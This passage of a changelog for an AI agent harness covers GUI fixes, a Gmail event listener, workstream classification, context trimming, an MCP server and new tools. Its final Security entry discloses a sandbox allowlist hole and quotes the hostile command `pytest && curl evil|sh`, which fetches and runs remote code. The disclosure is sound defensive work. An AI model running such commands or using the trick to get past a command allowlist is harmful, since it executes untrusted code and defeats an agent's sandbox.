  window. In the full-pane takeover the persona editor now grows into every
  remaining pixel (`flex-1`/`min-h-0`, no `rows`, no viewport clamp) and is the
  only scroll container in its tab, so there are no nested double scrollbars.
  Measured in a real browser: 26 visible lines at a 900px viewport, 52 at
  1400px. The Tools allowlist textarea gets the same treatment, and a
  Playwright spec (`ui/tests/config-takeover.spec.ts`) now measures the
  rendered height at two viewports so a third regression cannot ship quietly.
- **Chat no longer yanks you back to the newest message.** `ChatView` forced
  `scrollTop = scrollHeight` after every render, so a streaming delta pulled a
  reader who had scrolled up back to the bottom — and reset the scroll offset
  of the chat sitting behind the config takeover, which is supposed to be left
  exactly as it was. It now re-anchors only while the reader is already at the
  bottom (`lib/chatScroll.ts`).
- **Bulk backfills are bounded and resumable.** `max_messages`/`max_files` were
  taken from the model with no ceiling, and every fetched item accumulated in
  memory with the ledger committed only after the whole batch — so a large pull
  could exhaust memory, and a crash mid-fetch lost all progress. Both are now
  hard-clamped regardless of the caller's value, and items are fetched and
  committed in chunks, making each chunk a durable commit point. Drive's
  deletion sweep runs once at the end (via `okg_sweep_deleted`) rather than
  per chunk, which would have tombstoned everything outside the current page.
- **Drive files with no revision signal are re-ingested rather than frozen.**
  Such a file received a constant fingerprint, which the ledger read as
  "unchanged" forever. They are now marked volatile and always re-fetched.

- **`vector_search` had no `index_id` parameter and silently searched the
  wrong corpus (#3864):** personas documented `vector_search(index_id=…)`
  while the tool advertised no such field and was hardwired to the
  CWD-relative `.trusty-agents/state/code/` index, so index routing was a
  no-op (the live workaround was to grant `grep` instead). The tool now takes
  an optional `index_id`, defaulting to the agent's bound OKG store index, and
  routes to the shared trusty-search daemon (`POST /indexes/{id}/search`) when
  one resolves — an unqualified search hits the agent's OWN knowledge, an
  explicit id still targets another corpus. Every failure (undiscoverable
  daemon, missing index, transport error) degrades to the embedded index and
  then to the regex fallback, never an errored turn. `vector_search` is also
  now registered on the persona-chat dispatch path, where it previously was
  not — the grant in `cto-assistant`'s allowlist had nothing behind it.

### Changed

- **GUI OKG Stores pane is real:** the gear panel's OKG Stores tab now fetches
  `GET /api/agents/:name/stores` and renders observed state — CONNECTED with
  the index name, chunk count, readiness and indexed root, or NOT CONNECTED
  with the backend's reason (plus a separate line for palace health). The
  "Scaffolding — `agent.toml` has no OKG store binding field yet" placeholder
  and the client-side `scaffoldOkgStores()` fabricator are deleted; an agent
  that binds nothing now says so explicitly instead of showing a fake row.
- **First real eventstream listener: Gmail history-poll + agent wake (#3820,
  DOC-54 SPEC-AGENTS-04/06):** the third leg of the agent-config triple
  (stores / tools / **listeners**) lands with a working Gmail connector.
  Declarative config: harness-level `[[listeners]]` in `~/.trusty-agents/
  config.toml` (stage-one ingestion filter, `enabled = false` by default)
  and per-agent `[[listeners]]` bindings in `agent.toml` (stage-two wake
  filter — event types, sender globs). New `crate::listeners` module: a
  Gmail `history.list` polling engine (cursor persistence, dedup, exponential
  backoff, 410-GONE re-baseline — Pub/Sub-pull is deferred), an append-only
  JSONL event store under `~/.trusty-agents/events/` with a per-event-type
  include/exclude filter, and the stage-two wake dispatcher that reuses
  `run_pm_task_with_persona` (the same entry point `/agent` uses) so a wake
  reaction lands in the agent's chat history like an ordinary turn —
  ask-first framing, rate-limited to one wake per poll cycle (enforced by a
  pure cycle-gate, `listeners::wake::gate_wake`, threaded through
  `poll_once`'s per-event loop — every event is still durably stored
  regardless of whether its wake was rate-limited), every decision logged.
  `poll_interval_secs` is floored at 15s on config load (values below the
  floor are clamped up with a warning, not silently accepted) since this
  polls a real personal Gmail account. Cursor persistence
  (`~/.trusty-agents/events/cursor-<listener>.json`) writes atomically
  (temp-then-rename) and logs a warning on a malformed cursor read instead
  of silently re-baselining. New API: `GET /api/listener-events`, `POST
  /api/listener-events/filter` (named apart from the pre-existing SSE
  `/api/events` telemetry stream). Listener events also publish onto the
  existing harness event bus (`Event::ListenerEventReceived`) so the Events
  pane (#3818) updates live via the same SSE/Tauri bridge; the pane's
  `gmail` source bucket is now real data, not a concept placeholder. Per-
  connector event instructions load from `agents/<name>/events/<connector>.md`
  (#3817) when a listener wakes an agent. Izzie ships with a demo
  `gmail-personal` binding + `events/gmail.md`; enabling the live listener
  requires a `~/.trusty-agents/config.toml` stanza (never written by this
  code) — see the PR body. Deferred: Pub/Sub-pull transport, the Calendar
  connector, multi-agent fanout beyond the one-wake-per-cycle limit.

- **GUI reshape: WORKSTREAMS-backed "Tasks" sidebar, CHAT/EVENTS nav, and an
  in-pane agent config gear panel (#3819, epic #3052):** replaces the
  `PROJECTS` sidebar section and the `Chat/Projects/Personality` top nav.
  Sidebar now shows a pinned Concierge (`ctrl`) entry plus a "Tasks" list
  (user-facing label for trusty-memory's `ws:<name>`-tagged workstreams,
  DOC-53) grouped/collapsible by owning agent, each row resumable (injects
  recent tagged history as a context banner). Top nav is `Chat | Events`;
  Events is a deterministic, listener-tagged event list with per-source
  include/exclude toggles (excluded rows stay visible, muted) and inference-
  cost guidance copy. The chat pane gets its own header: the active agent's
  display name as the title, an inline selector (moved out of the top
  toolbar), and a gear icon opening an in-pane Personality/OKG
  Stores/Tools/Permissions/Listeners config form scoped to that agent — a
  new add-agent flow creates an agent from the `assistant` template.
  New backend surface: `GET /api/workstreams[/:name/history]`, `GET/PATCH
  /api/agents/:name` (extended with `personality`/`tools_allow`), `GET
  /api/agents/:name/persona`, `POST /api/agents` (template create). Also
  fixes a pre-existing bug where `PATCH /api/agents/:name` wrote a
  lower-priority flat TOML shadow instead of a directory-package agent's
  real `agent.toml` for every bundled demo agent (`assistant`/`izzie`/
  `cto-assistant`/`ctrl`). Adds `AgentInfo::hidden` (default `false`) — a
  listing-only visibility flag, independent of `role` (which also gates
  tool-registry security posture), honored by both the REPL's
  `list_assistant_agents_into` and the API roster (`GET /api/agents`).
  `ProjectsView`/`PersonalityPanel` are left in the tree but no longer
  routed — their dropped/relocated capabilities are documented in the PR
  body. Deferred to follow-ups: the eventstream connector backend (#3798
  family), tagging new outgoing memory writes with the resumed workstream,
  real per-listener wake plumbing, and reconciling "+ New Task" to Bob's
  later-refined "continuous per-agent chat, tasks are an inferred filter/
  view, not a context wall" model (this slice still clears context on "+ New
  Task", matching the pre-existing architecture).

- **Filterable-chat context assembly: in-band task classification, focused
  mode, and per-workstream summaries (DOC-54 §9.6 / SPEC-AGENTS-08,
  demo-day 2026-07-24):** `run_pm_task_with_persona` now appends a compact
  classification block to every turn's system prompt (the agent's closed
  label vocabulary + a `[[task: <label>]]` / `[[task: new: <label>]]`
  trailing-marker instruction), parses that marker out of the response
  before display, and persists the turn as a `ws:<label>`-tagged
  trusty-memory drawer — the same convention `GET /api/workstreams`
  already reads, so classified chat turns show up in the Tasks sidebar for
  free. New `/focus [<label>|off]` REPL command and `TaskRequest.focused_workstream`
  API field (chat-side parameter, in place of a separate focus-session
  endpoint) set the active workstream; when set, context assembly follows
  the spec's stable order — global summary (stub) → cached per-workstream
  summary → last `recent_window` raw turns — and the persisted response
  notes which task it's focused on. A cached per-workstream summary
  regenerates every `summarize_every` turns (one extra LLM call on the
  agent's own model/credentials). New per-agent `[workstreams]` TOML
  section (`enabled`, `summarize_every` default 5, `recent_window` default
  12). Task-bleed handling never restricts tools/memory or forces a
  mismatched classification — a turn that classifies outside the focused
  workstream is tagged honestly, logged, and gets a gentle inline nudge.
  New module `ctrl::pm_task::dispatch::classification`; shared read/write
  drawer primitives (`list_workstream_labels_at`, `drawers_by_tag_at`,
  `create_tagged_drawer_at`) added to `api::server::workstreams` (now
  `pub(crate)`, split into `workstreams/{mod,tests}.rs` to stay under the
  500-SLOC cap). Deferred: lazy summary invalidation on manual re-tag, a
  real global prompt-history summary source, periodic near-duplicate label
  consolidation, a persistent `POST /api/workstreams/:name/focus`
  session-state endpoint, and classification for the claude-cli subprocess
  persona path (separate execution model, out of scope for this slice).
  Verified end-to-end live against a real trusty-memory daemon (REPL +
  `/api/task`), routed through OpenRouter/Sonnet per the current provider
  policy: closed-vocab classification (new labels + correct reuse),
  `ws:`-tagged persistence, `/api/workstreams` rollup, focused-mode
  assembly in spec order, the task-bleed nudge, and the `summarize_every`
  cadence — including a real generated `ws-summary:<label>` drawer at the
  turn-5 boundary — all confirmed working. Minor noted gap (not fixed
  here, moot under the current no-Ollama operating policy): the
  summary-refresh one-shot call (`llm::chat_adapter_aware`) doesn't route
  an `ollama/`-prefixed persona model correctly (only Bedrock is
  special-cased) — caught and logged, the turn's own response/persistence
  is unaffected.

- **Filterable-context: critic-review fixes — marker hardening, a real
  `enabled` gate, and off-response-path persistence (PR #3840 review
  round, demo-day 2026-07-24):** three fixes to the classification slice
  above, pre-merge.
  1. `parse_marker` is now anchored to the response's own LAST LINE (not a
     bare "last occurrence anywhere" scan) and validates the parsed label
     against a `[a-z0-9-]{1,64}` charset allow-list before ever treating it
     as real. Closes two holes: a persona emitting the marker twice no
     longer leaves the first occurrence visible in the displayed text (both
     trailing marker lines are stripped; the last one is authoritative —
     documented in `parse_marker`'s doc comment), and a persona echoing the
     marker SYNTAX itself (e.g. explaining the convention, literally ending
     with `[[task: <label>]]`) can no longer have that placeholder text
     persisted as a real `ws:<label>` tag — charset validation rejects it
     (logged, turn left unclassified).
  2. `[workstreams].enabled` is now a REAL master switch: `false` skips the
     vocabulary fetch and classification-block rendering in
     `build_turn_context` entirely (focused-mode context assembly is
     skipped too — a stale user focus setting is inert on a disabled
     agent), AND gates `finish_turn`'s persistence — previously only the
     summarizer checked it.
  3. Turn persistence (`create_tagged_drawer_at`) and the cadence summary
     LLM call now run in a detached `tokio::spawn`ed task AFTER the
     response is parsed/nudged — the user sees their answer immediately
     instead of waiting through a second full LLM round trip on a cadence
     turn. Errors from the background task are logged exactly like the
     previous inline failures.
  New tests: `parse_marker_double_marker_strips_both_last_wins`,
  `parse_marker_trailing_syntax_echo_is_stripped_but_unclassified`,
  `parse_marker_ignores_trailing_syntax_echo_mid_sentence`,
  `is_valid_label_*`, `build_turn_context_disabled_is_a_real_no_op`,
  `finish_turn_disabled_does_not_persist`,
  `finish_turn_persists_via_detached_task` (the last two against a new
  mock-daemon harness proving both the `enabled` gate and the detached
  write land correctly).
  Folded in from the same review round (filed as issue #3843, not fixed
  here — both are pre-existing design gaps, not regressions, and don't
  affect the demo's short-lived workstreams): the in-band classification
  vocabulary has no label-count/character cap (unbounded up to trusty-memory's
  own 500-drawer scan limit); and `should_refresh_summary`'s turn count
  derives from a 200-capped fetch, so a workstream past 200 turns sticks at
  that count and re-fires the summary refresh EVERY turn instead of on
  cadence (needs a real stored turn counter, not a capped re-scan).
  Integration note for #3838 (Gmail eventstream listener + agent-wake):
  classification applies uniformly to every `run_pm_task_with_persona`
  turn, including event-reaction/wake turns — this is per-design (DOC-54
  §9.2: event reactions get classified into the continuous conversation
  like any other turn), not an oversight. Flagging for #3838's own
  integration smoke test to confirm one real wake turn parses/classifies
  cleanly (no marker leakage into the surfaced event-reaction text).

- **`tagent mcp-serve` — stdio MCP server exposing trusty-agents to external MCP
  clients (Claude Code, etc.) (#3633 core):** a line-delimited JSON-RPC / MCP
  server over stdio, built on the shared `trusty_common::mcp` framework
  (`run_stdio_loop` + `initialize_response`, protocol `2024-11-05`) with zero new
  dependencies. Ships two tools — `list_agents` (read-only; returns the same
  roster the `GET /api/agents` route serves, via a newly-extracted shared
  `agent_roster` fn) and `dispatch_task` (wraps the existing opaque, RBAC-gated
  `PmBridgeTool` rooted at the server's cwd). Dispatched before `run_startup_init`
  so the JSON-RPC stdout stream is never polluted by startup output. Deferred to
  epic #3633: HTTP/SSE transport, `rpc.discover`, tool namespacing, auth, and
  RBAC tier-mapping of external callers.

### Changed

- **No interim status text in the chat response bubble — the spinner is the
  sole waiting indicator:** the assistant bubble no longer fills with
  "Running…"/"submitted…"-style `task-progress` status strings. It stays empty
  (with a bare animated spinner shown beneath the thread — no "Running…" text
  label; `role="status"` + `aria-label` preserve the accessible busy-state
  name) until the first streamed `task-delta` or, for non-streaming providers,
  the final `task-complete` narrative arrives. Removed the two progress-text
  writes into message content (`ChatView`'s `task-progress` listener, dropped
  entirely; `InputArea`'s poll-reconcile write) and the spinner-row text label;
  the pending→real id reconcile itself is retained (it's load-bearing for
  streamed-delta attribution).
- **Base `assistant` persona defaults to Sonnet instead of Opus (#3688):**
  `claude-opus-4-6` → `claude-sonnet-4-6` on `assistant/agent.toml`, trading a
  small quality margin for materially lower per-turn latency (a trivial turn
  measured ~2.1s on Opus via OpenRouter). `pm` is unaffected and stays on Opus
  per the prior owner ruling (PR #3360).

### Fixed

- **Agent config gear panel's Personality/Tools textareas were unusably
  cramped:** the `persona.md` editor on the Personality tab (and the tools
  allowlist editor on the Tools tab) rendered as a ~2-line strip regardless
  of content length, because their `flex-1` sizing had no definite height
  floor. Both textareas now get a `min-h-[55vh]`/`max-h-[70vh]` range with
  vertical resize (`resize-y`) and internal scroll; the Personality Save
  button is now sticky so it stays visible below the taller field.
- **Agent pickers list only assistant-role agents, not the 16 bundled
  coding/engineer/support agents:** the GUI/Tauri picker and MCP
  `list_agents` tool (both backed by `agent_roster`/`scan_agent_catalog`)
  and the REPL's `/agents` slash command (previously a flat, non-role-aware
  `discover_agent_names` glob that disagreed with `/agent`) now filter to
  `role == "assistant"` — a missing/unparseable role is treated as
  NOT-assistant (fail-closed), so a malformed manifest can never leak a
  coding agent back into a picker. `/agents` now delegates to the same
  filtered listing `/agent` (no arg) already used, so the two can't drift
  again. `*.stale.bak` directory-package backups (e.g. `izzie.stale.bak/`)
  are additionally excluded from the REPL listing (the GUI/API catalog
  already excluded them). Direct by-name resolution — `/agent <name>`,
  `/switch`, and `delegate_to_agent` (which resolves targets directly via
  `AgentConfig::by_name_in`, never through the roster) — is unaffected, so
  ctrl/pm/coding agents remain fully dispatchable though no longer listed.
- **Agent picker no longer loses Izzie / CTO Bot on a cold start:** the
  `AgentSwitcher` (and `ModelSwitcher`) fetched their catalog exactly once in
  `onMount`, but `<Header>` — and therefore both pickers — renders before
  `apiReady`. On a packaged-app cold start the sidecar isn't listening yet, so
  that first `GET /api/agents` fetch failed, `catalogAgents` stayed empty with
  no retry, and the roster showed only the built-in "Assistant" for the whole
  session (Izzie / CTO Bot never selectable). `App.svelte` now re-drives the
  agent + model catalog loads (and the overlay refresh) whenever `apiReady`
  flips true, backfilling the already-mounted pickers via their reactive stores
  (and refetching on any later sidecar reconnect). The `GET /api/agents` roster
  itself was already correct — it returns all bundled personas including the
  `izzie`/`cto-assistant` directory packages.
- **Recent Tasks no longer lists chat replies as junk "(empty)" rows:** every
  chat turn (a Conversational/Research message) is finalized as a
  `type: "agent_response"` `PmResponse` with an empty request field, so
  `GET /api/tasks` returned them and the workflow-oriented Recent Tasks panel
  rendered them as "(empty)" success rows. The panel now filters on a shared
  pure predicate (`lib/taskHistory.ts::isDisplayableTask`) that excludes
  `agent_response` (chat) envelopes — chat is not a workflow run — while keeping
  the pre-existing rule that hides the contentless running placeholder; the
  empty-state and Clear affordance now key off the visible count.
- **Telegram `/switch assistant` now resolves the canonical package persona:**
  the `/switch` pre-check validated FLAT persona files only
  (`.trusty-agents/agents/<name>.toml` and the `$HOME` equivalent), so the
  canonical `assistant` persona — which ships ONLY as a directory package
  (`agents/assistant/agent.toml` + `persona.md`, no flat `assistant.toml`) —
  was rejected with "Unknown persona: assistant" even though the real dispatch
  resolver (`AgentConfig::by_name_async`) loads directory packages fine. The
  pre-check (both the project-local tier and the `$HOME` fallback) now also
  accepts a directory package (`agents/<name>/agent.toml`), mirroring the
  resolver's order. No alias-table or migration changes.
- **MCP tool results no longer collapse the live conversation to the system
  prompt:** an MCP tool result (e.g. `grep` via trusty-search) is shrunk by no
  `compress_tool_output` filter and can be multiple megabytes; the send-time
  context trimmer's pure oldest-first, whole-message eviction then evicted the
  user's question AND the assistant tool-call turn AND the result itself,
  leaving only the protected system message — so the follow-up completion
  answered with zero context (`input_tokens` flatlined at the system-prompt
  size and the model ignored the tool output). `ContextManager::trim_to_budget`
  now splits the history into three regions — the protected system header, an
  OLD history region, and a RECENCY window (the "live turn": from the last user
  message to the end) — and applies strategies in increasing order of damage:
  (1) water-fill-truncate only the OLD region, keeping the header AND the newest
  turn at FULL fidelity; (2) evict oldest OLD messages (never the header, never
  the recency window); (3) as a last resort — when the oversized message is
  itself inside the live turn (the MCP shape) — truncate within the recency
  window so the question and every assistant/tool pairing survive rather than
  being evicted. This preserves THREE guarantees at once: the live conversation
  never collapses; the **newest turn keeps full fidelity** whenever the budget
  allows (restoring what oldest-first eviction implicitly gave — a
  uniformly-sized long conversation no longer shrinks its most recent message);
  and **no assistant `tool_calls` message is ever separated from its `tool`
  results** — the recency boundary is pairing-atomic (it can't split a
  multi-tool-call group even in a tools-only continuation with no user message)
  and Strategy 2 evicts tool-call groups atomically by sweeping the whole
  history regardless of message ordering/adjacency (so even adversarial or
  replayed interleaved groups leave whole), so the request never carries an
  orphaned `tool_call_id` that OpenAI/OpenRouter would reject.
  Truncation is logged distinctly from eviction so it never masquerades as the
  catastrophic path.
- **Chat stream renders inside ONE stable assistant bubble — no mid-stream
  flicker:** as `task-delta` tokens arrived the reply bubble visibly flashed
  because each delta fired two separate `messages` store writes (content, then
  speaker), doubling the keyed-`{#each}` re-render + forced scroll reflow per
  token. Now a single `streamDeltaIntoTask` write funnels content + speaker
  into the ONE bubble whose `taskId` matches the delta's globally-unique
  backend id, rewriting only `content`/`speaker` so the message `id` is
  preserved (the keyed `{#each}` patches, never re-mounts). Attribution is by
  exact backend id, searched across every conversation — never by list position
  and never scoped to the currently-viewed project — so a background stream
  reaches its own bubble after a project switch and one turn's tokens can never
  land in another turn's or project's bubble; an unattributable frame (e.g.
  arriving before the poll loop reconciles the `pending-<ts>` id) is dropped,
  and its text — held by the shared `streamAccumulator` — appears on the first
  matching write. No-op frames skip the store `set` entirely, so they notify no
  subscribers. `InputArea`'s reconcile and `ChatView`'s progress handler both
  gate on the shared `streamAccumulator` so neither overwrites live streamed
  text.
- **Persona chat turns no longer exhaust `max_turns` after a couple of tool
  calls:** `run_pm_task_with_persona` (the `/agent`/`--direct` persona REPL
  turn) hardcoded its `chat_with_tools_gated` ceiling to 2 turns (no tools) or
  4 turns (with tools) since #254 and never consulted config, unlike the
  general subagent tool loop's `[llm].max_turns`. A persona running a couple
  of sequential tool calls (e.g. two `grep`s plus a summary) routinely
  exhausted the 4-turn budget and failed with `chat_with_tools exceeded
  max_turns`. The tool-using default is now 8 (raised from 4) and is
  overridable per agent via the new `[llm].persona_max_turns` TOML field; the
  no-tools case is unchanged (still 2).
- **Izzie's own tools now reach the `--direct`/`--agent` dispatch path (#3745
  item C):** `tagent --direct izzie` loaded a tool registry of only
  `[git_log, git_status, web_search, delegate_to_agent]` and the model answered
  "weather tool unavailable" — despite `izzie/agent.toml` declaring
  `get_weather`, `get_train_schedule`, and `get_train_alerts` in `[tools].allow`.
  Root cause: the assistant-tier subprocess registry
  (`runtime::tool_registry::build_assistant_tier_registry`) never registered the
  izzie platform-hosted executors, so `scope_assistant_allowed_tools` intersected
  the (correct) allow list against a registry lacking those tools and dropped
  them. The persona-chat REPL path (`run_pm_task_with_persona`) already registered
  them via `crate::tools::izzie::izzie_tools()`; the two dispatch paths had
  diverged. Fix registers `izzie_tools()` into the assistant-tier registry so both
  paths behave identically — reachability is still gated per-persona by
  `[tools].allow`, so no other assistant-tier persona is widened. Config
  resolution (package-vs-flat, `extends` merge) was verified correct and is
  unchanged.

### Added

- **Token-level streaming for the conversational / persona chat turn:** the
  no-tools conversational fast path and tools-off persona chat now stream the
  model reply token-by-token when the turn routes over the OpenRouter transport
  (not Bedrock / Fireworks / Anthropic-direct). A new `Event::AgentMessageDelta
  { session_id, agent, text, done }` variant is published per coalesced ~60ms
  batch (bounding bus pressure) and relayed unchanged over the existing
  `/api/events` SSE stream; the assembled full text is still returned so
  history, `PmResponse`, and responder attribution (#3739) behave exactly as
  the blocking path. Streaming can be disabled wholesale with
  `TAGENT_CHAT_STREAMING=0`, and any streaming failure transparently falls back
  to the blocking chat call — non-streaming providers are unaffected. New
  `llm::stream` module (`drive_delta_stream` batching core, `stream_reply`
  provider wiring, `streaming_supported` capability gate) with unit tests
  covering ordered fragments, the terminal `done` flag, and assembled-text
  equality.

- **Live Slack conversation mirror in the GUI (#3752, epic #3052):** when the
  CTO Bot converses on Slack (`tagent --slack`), the trusty-agents GUI now shows
  both sides of the exchange live — the inbound human message (with an honest
  RBAC-tier badge resolved from `ChatSession.user_identity`) and the bot's reply
  (badged `CTO Bot (as itself)`, the honest label — there is no impersonation
  mode in code). Implemented as a **low-risk relay**, not a process merge: two
  additive `Event` variants (`SlackMessageReceived` / `SlackReplySent`); a new
  `POST /api/internal/relay-event` endpoint on the `--api` server, gated by a
  **mandatory shared secret** (`TAGENT_RELAY_TOKEN`, sent as `x-relay-token`) —
  the endpoint **fails closed**, rejecting every post when the secret is unset
  server-side, since the origin guard alone admits absent-`Origin` local callers
  who could otherwise forge a reply with a fabricated identity badge. It also
  whitelists only those two `Slack*` kinds, validates the inbound `tier` against
  the closed `ServiceTier` set, and re-publishes survivors onto the bus feeding
  `/api/events`; a fire-and-forget relay call from
  `slack/handlers.rs` (inbound after dispatch, reply after `post_message`
  succeeds — Slack handling never blocks or fails on relay errors,
  `TAGENT_API_RELAY_URL` default `http://127.0.0.1:8765`); and a Foundry-styled
  `SlackMirror` pane that mounts only once Slack activity arrives. Badges surface
  only introspectable facts (RBAC tier + bot identity); no invented auth states.
- **Agent context knows "now", "here", and "who" (#3469, epic #3052):** the
  `## User Context` block prefixed onto every tagent system prompt (PM, persona,
  and ctrl turns) now carries three things the model previously had to guess at,
  which matters for the weather / Metro-North tools that answer time- and
  location-sensitive questions. (1) A per-turn, timezone-aware date/time line
  with explicit day-of-week, rendered in the user's configured IANA zone via
  `chrono-tz` (falling back to UTC and saying so when the zone is missing or
  unparseable) — fixing the "hope your Sunday's going well" / "happy Monday!"
  drift from a once-computed timestamp. (2) An optional, user-supplied
  `location` profile field (`tagent config profile set --location`,
  `TAGENT_USER_LOCATION`, or the first-run interview; no IP geolocation, no
  inference from timezone, omitted entirely when unset). (3) An agent
  self-identification sentence built from the SAME resolved values used for the
  turn's real LLM dispatch (`creds.label()`, `agent.runner`, `agent.model`), so
  the persona can no longer claim "Anthropic's API" while actually running via
  OpenRouter. This change reconciles the self-identification decision-record
  that had drifted out of sync after PR #3461 (whose body declared the line
  descoped even though it shipped), documents the previously-undocumented
  `AgentIdentity` carrier, and records the whole capability under its tracking
  issue.

- **Chat speaker attribution reflects who ANSWERED (#3737, epic #3052):** two
  API-layer additions so the desktop GUI can label each assistant chat bubble
  with the specific persona that produced it ("Izzie", "CTO Assistant") instead
  of a generic "agent". (1) `GET /api/agents` surfaces each agent's
  `display_name` (from the TOML `[agent].display_name`; per the #3740 contract
  it is never empty — a blank/absent value falls back to the agent name).
  (2) `PmResponse` gains a `responder_agent` field: when a conversational/
  research turn DELEGATES (e.g. base "Assistant" hands a weather question to
  Izzie via `delegate_to_agent`), the server records the specialist that
  actually answered — `delegate_to_agent` now emits `AgentSpawned` on a
  successful delegation and `submit_task` captures the last such event for the
  turn — so the GUI relabels the bubble to the responder rather than the caller.
  `responder_agent` is omitted from the wire when no delegation fired, keeping
  the common-case shape byte-identical.

- **`DELETE /api/tasks` clears the finished-task history (#3737, epic
  #3052):** backs the GUI's "Recent tasks" Clear affordance. Removes only
  terminal (success/error/partial/cancelled) tasks and leaves any still-running
  task in place, re-persisting the trimmed snapshot to `tasks.json`.
  Deliberately distinct from `POST /api/clear-context`, which additionally
  aborts in-flight work — tidying the history list must not kill a running
  task.

- **Izzie weather + Metro-North tools land as real platform-hosted tools
  (epic #3052):** the `izzie-weather` and `izzie-metro-north` skills named
  three tools — `get_weather`, `get_train_schedule`, `get_train_alerts` — that
  the persona advertised but that were never implemented, so the assistant
  could only refuse. All three now exist under `tools/izzie/`, are registered
  into the persona dispatch superset alongside git / ticketing / `system_status`,
  and are admitted by izzie's `[tools].allow`. `get_weather` returns current
  conditions + a short daily forecast (Open-Meteo) plus active US severe-weather
  alerts (NWS), keyless. `get_train_schedule` / `get_train_alerts` read the
  keyless MTA Metro-North GTFS-Realtime feed via a small dependency-free
  protobuf decoder, resolve station names to real GTFS stop_ids, and return the
  next departures (with assigned track and downstream arrival) / active service
  alerts as structured JSON in Eastern time. Any optional gateway credential is
  read from `MTA_API_KEY` with graceful degradation; the feed URL is overridable
  via `IZZIE_MNR_GTFS_RT_URL`.

- **Fireworks AI is reachable as an inference provider (#2410 Step 3, epic
  #2400):** `fireworks/<model>` now resolves to a dedicated
  `FireworksAdapter` (new `Provider::Fireworks` / `AuthSource::Fireworks`)
  instead of falling through to `GenericAdapter`, which unconditionally
  sent the request to OpenRouter carrying a Fireworks-native model id that
  OpenRouter does not recognize. The credential resolves through the same
  shared env > `.env.local` > secure-store resolver every other provider in
  this crate uses, the routing prefix is stripped before the request body is
  built (matching the `ollama/` treatment), and
  `reachable_today(ProviderId::Fireworks)` flips to `true`.
- **Missing-credential errors name the real provider:**
  `send_raw_completion` previously reported `"openrouter credential not
  found"` regardless of which adapter was actually in play; a Fireworks-routed
  call with no `FIREWORKS_API_KEY` now says so. The usage-log `runner` field
  likewise reports `"fireworks"` rather than defaulting to `"openrouter"`.

- **`dispatch_task` — the opaque tm<->tcode PM bridge tool (epic #3052, PR
  B, lane 3):** a new tool, distinct from lane 2's `delegate_to_agent`
  in-process sub-agent delegation, that routes a unit of work to either
  `tm` (orchestration / project / session / issue / PR / multi-agent work)
  or `tcode` (direct coding in a repo) via a deterministic, pure-function
  router (`intent::route::route_task`) — no LLM call, same input always
  routes the same way. The tool's name, schema, and results are fully
  black-boxed: neither backend's identity, nor `trusty-mpm`/`trusty-code`,
  is ever named in the schema, and the full backend transcript is run
  through `tools::pm_bridge::scrub_branding` (strips standalone
  `tm`/`tcode`/`trusty-mpm`/`trusty-code` tokens and redacts
  session-id-shaped artifacts) before returning, on both the success and
  error paths. RBAC-locked to deny `ServiceTier::ReadOnly` AND
  `ServiceTier::Analytics` — registered in the interactive assistant
  registry (`ctrl::pm_task::dispatch::history`) and the PM CLI registry
  (`runtime::pm_mode`), mirroring `delegate_to_agent`'s registration.
  Backend dispatch: `tcode` runs as a one-shot blocking subprocess
  (`tcode run-task pm <task> --project <dir> --json`), which itself blocks
  until its daemon-owned session reaches a terminal state; `tm` spawns
  `tm serve --stdio` and drives the managed-session lifecycle
  (`session_new` / `session_activity` / `session_decommission`) with a
  bounded poll, since tm has no synchronous "run this task headlessly"
  RPC (`agent_delegate` is explicitly a tracking/gating companion, NOT an
  execution path) — a documented MVP scope limit, flagged for a follow-up
  RPC.

### Changed

- **Generic "Assistant" is the default persona; Izzie / CTO Bot are selectable
  (owner decision, #3738, epic #3052):** the base `assistant/` package is now
  the concrete GENERIC default persona with a professional display name
  `"Assistant"` (reversing the prior "bases are nameless" decision) — it stays
  the un-personalized `extends` base for the named personas, which override
  `display_name` via child-Some-wins per-key merge. `cto-assistant`'s display
  name is renamed `"CTO Assistant"` → `"CTO Bot"` (a new `"cto bot"` `/switch`
  alias is added; existing aliases still work). Izzie keeps display name
  `"Izzie"` and her flavor in her own overlay. The deprecated `ctrl` coordinator
  persona stays in place and reachable via `/switch ctrl`, but nothing defaults
  to it (the plain-CLI startup already auto-switches to `assistant`; the
  `/switch` help and picker now list Assistant first and mark ctrl deprecated).
  A single canonical accessor `AgentInfo::display_label()` (`display_name` →
  `name` fallback) now drives the speaker label, and `GET /api/agents` surfaces
  `display_name` so the GUI's per-message speaker attribution reads
  "Assistant" / "Izzie" / "CTO Bot" from the backend without re-deriving the
  mapping client-side. Tool registrations (weather / Metro-North on Izzie) are
  unchanged — no tool scopes moved.

### Fixed

- **`tagent --api` self-exits when its parent GUI dies (#3734):** the sidecar
  now accepts `--parent-pid <pid>` and, when given one, arms a parent-death
  watchdog that self-exits the process once that parent is gone (detected by
  reparenting away from it — on macOS to launchd, pid 1 — or the pid vanishing
  outright). This closes the orphan class the Tauri-side quit reap cannot cover:
  a GUI killed by macOS's synchronous Cmd+Q teardown, a crash, or an external
  SIGTERM/SIGKILL previously left `tagent --api` running and holding its fixed
  port, so a later GUI launch could fail to bind or attach to a stale backend.
  Absent the flag (e.g. a hand-run `tagent --api` in a shell) the watchdog is
  simply not armed. Unix-only; a no-op on other targets. `GET /api/health` now
  also reports the sidecar's `pid` and `ppid` so a GUI can verify it is talking
  to the sidecar it spawned rather than a reparented orphan on the same port.

- **A parallel phase could not fail when its merge failed (#3671):**
  `executor::dispatch` folded `ConflictResolver::merge`'s `Err` into a
  `"merge failed: ..."` string appended to the phase's content and returned
  `Ok(AgentOutput)` regardless. `merge()` only errors on a genuine I/O fault
  (`create_dir_all`/`read_dir`/`read`/`write`) — every recoverable conflict
  (a failed `git merge-file`, a failed LLM fallback) is already degraded to
  `Ok` with the reason recorded in the merge report. So a real `Err` meant the
  merged tree on disk was incomplete and nondeterministic (the collection
  loop walks a `HashMap` and can bail partway through), yet downstream phases
  consumed it as if it were whole, with the failure visible only as a buried
  string. `merge`'s `Err` now propagates as `WorkflowError::PhaseFailed`,
  failing the phase/workflow instead. Sibling of #3652/#3653/#3675 (the same
  "silent success" bug class).

### Security

- **`pytest_exec` (`ShellExecTool`) no longer executes through a shell (#3679):**
  the allowlist previously vetted only the command string's leading prefix,
  then handed the whole, unmodified string to `/bin/sh -c` — anything after
  the recognized prefix (`pytest && curl evil|sh`) was live shell syntax, a
  full arbitrary-command-execution hole in what's documented as the QA
  agent's sandbox. `resolve_allowed_argv()` now quote-aware tokenizes the
  command and requires the entire leading token sequence to exactly match a
  known test-runner invocation (whole-token comparison, never a string
